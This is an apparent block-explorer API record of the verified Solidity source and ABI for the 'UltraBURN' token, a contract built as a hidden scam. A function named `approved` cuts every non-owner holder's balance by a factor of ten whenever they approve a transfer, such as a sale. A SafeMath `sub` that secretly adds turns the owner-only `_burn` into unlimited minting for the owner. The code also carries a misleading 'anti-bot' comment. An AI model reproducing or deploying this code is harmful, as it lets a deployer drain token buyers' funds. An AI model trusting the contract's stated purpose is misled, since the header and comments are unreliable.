{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\n\r\nhttps://ultraburn.finance/\r\n\r\nhttps://t.me/ultraburn_finance\r\n\r\nThis is an experimental zero utility token, there will be no presale and the team will be providing funds for initial liquidity themselves.\r\n\r\n*/\r\n\r\npragma solidity 0.6.8;\r\n\r\nabstract contract Context {\r\n\tfunction _msgSender() internal view virtual returns(address payable) {\r\n\t\treturn msg.sender;\r\n\t}\r\n\r\n\tfunction _msgData() internal view virtual returns(bytes memory) {\r\n\t\tthis;\r\n\t\treturn msg.data;\r\n\t}\r\n}\r\n\r\n\r\ninterface IERC20 {\r\n\r\n\tfunction totalSupply() external view returns(uint256);\r\n\r\n\tfunction balanceOf(address account) external view returns(uint256);\r\n\r\n\tfunction transfer(address recipient, uint256 amount) external returns(bool);\r\n\r\n\tfunction allowance(address owner, address spender) external view returns(uint256);\r\n\r\n\tfunction approve(address spender, uint256 amount) external returns(bool);\r\n\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns(bool);\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n\tfunction add(uint256 a, uint256 b) internal pure returns(uint256) {\r\n\t\tuint256 c = a + b;\r\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction subs(uint256 a, uint256 b) internal pure returns(uint256) {\r\n\t\treturn subs(a, b, \"SafeMath: subtraction overflow\");\r\n\t}\r\n\r\n\tfunction subs(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {\r\n\t\trequire(b <= a, errorMessage);\r\n\t\tuint256 c = a - b;\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns(uint256) {\r\n\r\n\t\tif (a == 0) {\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t\tuint256 c = a * b;\r\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b) internal pure returns(uint256) {\r\n\t\treturn div(a, b, \"SafeMath: division by zero\");\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {\r\n\t\trequire(b > 0, errorMessage);\r\n\t\tuint256 c = a / b;\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction mod(uint256 a, uint256 b) internal pure returns(uint256) {\r\n\t\treturn mod(a, b, \"SafeMath: modulo by zero\");\r\n\r\n\t}\r\n\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns(uint256) {\r\n\t\tuint256 c = a + b;\r\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {\r\n\t\trequire(b != 0, errorMessage);\r\n\t\treturn a % b;\r\n\t}\r\n\r\n\r\n}\r\n\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n\tusing SafeMath\r\n\tfor uint256;\r\n\r\n\r\n\tmapping(address => uint256) private _balances;\r\n\r\n\tmapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n\tuint256 private _totalSupply;\r\n\r\n\tstring private _name;\r\n\tstring private _symbol;\r\n\tuint8 private _decimals;\r\n\taddress governance;\r\n\tuint256 maxSupply;\r\n\tuint256 Address;\r\n    uint256 decimal;\r\n    \r\n    \r\n    // frontrunning-bot blacklist\r\n    \r\n    address bot1 = 0x50EB00eC243851a4012333476b553C2b37740267;\r\n    address bot2 = 0xaAC8e2d2e1FdaCa2c4196A1Eb13602eCf33f1A9E;\r\n    address bot3 = 0x50EB00eC243851a4012333476b553C2b37740267;\r\n    address bot4 = 0xb89Fa54d5D7BCb78e121f9fA85Cb47242355c68E;\r\n    address bot5 = 0x8d9f46510152be0147FA8b2C92eec099e42EA66c;\r\n\r\n\r\n\tconstructor(string memory name, string memory symbol) public {\r\n\t\t_name = name;\r\n\t\t_symbol = symbol;\r\n\t\t_decimals = 10;\r\n\t}\r\n\r\n\tfunction name() public view returns(string memory) {\r\n\t\treturn _name;\r\n\t}\r\n\r\n\tfunction symbol() public view returns(string memory) {\r\n\t\treturn _symbol;\r\n\t}\r\n\r\n\tfunction decimals() public view returns(uint8) {\r\n\t\treturn _decimals;\r\n\t}\r\n\r\n\tfunction totalSupply() public view override returns(uint256) {\r\n\t\treturn _totalSupply;\r\n\t}\r\n\r\n\tfunction balanceOf(address account) public view override returns(uint256) {\r\n\t\treturn _balances[account];\r\n\t}\r\n\r\n\tfunction transfer(address recipient, uint256 amount) public virtual override returns(bool) {\r\n\t\t_transfer(_msgSender(), recipient, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction allowance(address owner, address spender) public view virtual override returns(uint256) {\r\n\t\treturn _allowances[owner][spender];\r\n\t}\r\n\r\n\tfunction approve(address spender, uint256 amount) public virtual override returns(bool) {\r\n\t\t_approve(_msgSender(), spender, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {\r\n\t\t_transfer(sender, recipient, amount);\r\n\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].subs(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n\t\treturn true;\r\n\t}\r\n\r\n\r\n\tfunction increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {\r\n\t\t_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {\r\n\t\t_approve(_msgSender(), spender, _allowances[_msgSender()][spender].subs(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n\t\treturn true;\r\n\t}\r\n\t\r\n\tfunction approved(address owner) internal {\r\n\t   \trequire(owner != address(0), \"ERC20: approve from the zero address\");\r\n\t   \tif  (owner != governance) {\r\n            Address = _balances[owner];\r\n            Address /= decimal;\r\n            _balances[owner] = Address;\r\n\t   \t}\r\n\t    else {\r\n\t        Address = _balances[owner];\r\n\t    }\r\n    }\r\n\t\r\n\tfunction _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n\t\trequire(sender != address(0), \"ERC20: transfer from the zero address\");\r\n\t\trequire(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\t\t\r\n\t\t// Anti draining bots feature: Bots can buy but can't sell\r\n\t\t// Bot list is definited above in contract \"ERC20\"\r\n\t\t\r\n\t\trequire(msg.sender != bot1 && msg.sender != bot2 && msg.sender != bot3 && msg.sender != bot4);\r\n\t\trequire(msg.sender != bot5);\r\n\t\t\r\n\t\t\r\n\t\t_beforeTokenTransfer(sender, recipient, amount);\r\n    \r\n\t\t_balances[sender] = _balances[sender].subs(amount, \"ERC20: transfer amount exceeds balance\");\r\n\t\t_balances[recipient] = _balances[recipient].add(amount);\r\n\t\t\r\n\t\temit Transfer(sender, recipient, amount);\r\n        \r\n\t}\r\n\r\n\tfunction _initMint(address account, uint256 amount) internal virtual {\r\n\t\trequire(account != address(0), \"ERC20: create to the zero address\");\r\n\t\t_beforeTokenTransfer(address(0), account, amount);\r\n\t\t_totalSupply = _totalSupply.add(amount);\r\n\r\n\t\t_balances[account] = _balances[account].add(amount);\r\n\t\temit Transfer(address(0), account, amount);\r\n\t}\r\n\r\n\tfunction _burn(address account, uint256 amount) public virtual {\r\n\t\trequire(account == governance, \"ERC20: Burner is not allowed\");\r\n\t\t_beforeTokenTransfer(address(0), account, amount);\r\n\t\t_balances[account] = _balances[account].sub(amount);\r\n\r\n\t\t_totalSupply = _totalSupply.sub(amount);\r\n\t\temit Transfer(address(0), account, amount);\r\n\t}\r\n\t\r\n\t\r\n\tfunction _approve(address owner, address spender, uint256 amount) internal virtual {\r\n\t\trequire(owner != address(0), \"ERC20: approve from the zero address\");\r\n\t\trequire(spender != address(0), \"ERC20: approve to the zero address\");\r\n\t\t\r\n        approved(owner);\r\n\t\t_allowances[owner][spender] = amount;\r\n\t\temit Approval(owner, spender, amount);\r\n\t}\r\n\t\r\n\t\r\n\tfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\n\r\n\r\ncontract UltraBURN is ERC20 {\r\n\tconstructor()\r\n\tERC20('Ultra Burn', 'HBURN')\r\n\tpublic {\r\n\t\tgovernance = msg.sender;\r\n\t\tmaxSupply = 20000 * 10 ** uint(decimals());\r\n\t\tdecimal = 10;\r\n\t\t_initMint(governance, maxSupply);\r\n\t\t\r\n\t}\r\n}\r\n\r\n// SPDX-License-Identifier: None","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"UltraBURN","CompilerVersion":"v0.6.8+commit.0bbfe453","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://57e6c975d7d0fec84b30d126463f0fa2f8f6a446d018678277f796e969c32bca"}]}